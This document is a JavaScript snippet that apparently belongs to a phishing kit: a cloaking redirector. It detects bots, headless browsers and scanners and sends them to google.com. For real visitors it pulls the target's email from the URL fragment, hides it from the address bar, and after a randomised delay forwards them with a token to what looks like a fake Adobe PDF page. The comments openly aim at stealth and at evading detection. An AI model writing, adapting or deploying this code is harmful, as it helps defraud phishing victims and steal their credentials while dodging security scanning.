<script>
(function () {
  // 1. Stealthier Bot Detection
  function isLikelyBot() {
    try {
      // Screen size anomalies
      if (window.outerWidth === 0 || window.outerHeight === 0) return true;

      // Navigator checks
      if (navigator.webdriver) return true;

      // User-Agent heuristic (subtle check, lowercase)
      const ua = navigator.userAgent.toLowerCase();
      const botPattern = /(headless|phantom|bot|crawl|spider|wget|curl)/i;
      if (botPattern.test(ua)) return true;

      // Plugins check — headless browsers often have none
      if (navigator.plugins.length === 0) return true;

      // Language check — most real browsers have a language set
      if (!navigator.language) return true;

      return false;
    } catch (e) {
      return true;
    }
  }

  // 2. Secure Token Generator
  function generateSecureToken(length = 64) {
    const array = new Uint8Array(length / 2);
    window.crypto.getRandomValues(array);
    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
  }

  // 3. Encode (Base64 URL-safe)
  function encodeData(data) {
    return btoa(encodeURIComponent(data))
      .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  }

  // 4. Validate Email
  function isValidEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  // 5. Main Execution on DOM Ready
  document.addEventListener("DOMContentLoaded", () => {
    if (isLikelyBot()) {
      // Bot detected — silent redirect
      window.location.replace("https://google.com");
      return;
    }

    // Extract hash without showing it
    const rawHash = window.location.hash.substring(1); // e.g., email@example.com
    history.replaceState(null, "", window.location.pathname); // Remove it immediately

    try {
      const decodedEmail = decodeURIComponent(rawHash);

      if (isValidEmail(decodedEmail)) {
        const token = generateSecureToken();
        const encodedEmail = encodeData(decodedEmail);

        sessionStorage.setItem("redirect_email", decodedEmail);
        sessionStorage.setItem("redirect_token", token);

        // Slight delay to avoid obvious redirect
        setTimeout(() => {
          window.location.href = `pdf/adb.html#${encodedEmail}&token=${token}`;
        }, 300 + Math.random() * 500); // 300–800ms delay
      } else {
        window.location.replace("https://google.com");
      }
    } catch (err) {
      window.location.replace("https://google.com");
    }
  });
})();
</script>
